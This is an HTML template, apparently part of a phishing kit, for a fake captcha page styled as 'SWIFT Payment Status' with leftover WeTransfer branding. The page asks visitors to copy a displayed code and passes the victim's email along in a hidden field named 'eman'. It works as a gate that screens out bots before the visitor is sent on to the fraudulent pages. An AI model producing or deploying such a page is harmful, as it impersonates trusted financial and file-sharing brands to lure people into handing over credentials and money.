<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title> Security Verification</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap">
 <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #F4F6F8;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #333;
      box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.1);
    }

   }

    /* WeTransfer Logo */
    .brand-logo {
      margin-bottom: 10px;
    }

    .brand-logo img {
      height: 48px;
      width: auto;
      filter: brightness(0) invert(1); /* White logo on orange */
    }
    h1 {
      font-size: 32px;
      margin-bottom: 15px;
      color: #2980B9; 
    }

    p {
      font-size: 16px;
      margin-bottom: 30px;
      text-align: center;
      color: #555;
    }

    #captcha-container {
      width: 250px;
      height: 100px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 36px;
      font-weight: bold;
      color: #FFFFFF;
      background-color: {{ color }}; /* Dynamically set color */
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
      margin-bottom: 20px;
      transition: transform 0.3s; /* Add transition for hover effect */
    }

    #captcha-container:hover {
      transform: scale(1.05); /* Slightly enlarge on hover */
    }

    #captcha-form {
      text-align: center;
      background: #FFFFFF;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
    }

    #captcha-input {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border: 2px solid #2980B9;
      border-radius: 5px;
      font-size: 16px;
      box-sizing: border-box;
      color: #2C3E50;
      transition: border-color 0.3s;
    }

    #captcha-input:focus {
      border-color: #E74C3C; /* Change border color on focus */
      outline: none; /* Remove default outline */
    }

    #captcha-submit {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      background-color: #2980B9; 
      color: #FFFFFF;
      cursor: pointer;
      transition: background-color 0.3s, transform 0.3s; /* Add transform transition */
    }

    #captcha-submit:hover {
      background-color: #1F618D; 
      transform: scale(1.05); /* Enlarge on hover */
    }

    #captcha-message {
      color: #E74C3C;
      text-align: center;
      margin-top: 10px;
      display: none;
    }
  </style>
</head>
<body>
 

  <h1>SWIFT Payment Status</h1>
  <p class="subtitle">Enter your payment  reference number below to view</p>

  <div id="captcha-container">{{ code }}</div>

  <form id="captcha-form" method="POST" action="{{ url_for('captcha') }}">
    <input id="captcha-input" type="text" placeholder="Enter payment ref here" name="code" required autocomplete="off">
    <input type="hidden" name="web" value="{{ eman }}">
    <br>
    <button id="captcha-submit" type="submit">Check Payment Status</button>
  </form>

  <p id="captcha-message"></p>

  <p class="footer-text">© Swift payment transfer</p>

  <script>
    var captchaForm = document.getElementById('captcha-form');
    var errorMessage = document.getElementById('captcha-message');

    captchaForm.addEventListener('submit', function(event) {
      event.preventDefault();
      var captchaInput = document.getElementById('captcha-input');
      var correctCode = "{{ code }}";

      if (captchaInput.value == correctCode) {
        captchaForm.submit();
      } else {
        errorMessage.innerText = 'The code you entered is incorrect. Please try again.';
        errorMessage.style.display = 'block';
        captchaInput.value = '';
        captchaInput.focus();
      }
    });
  </script>
</body>
</html>
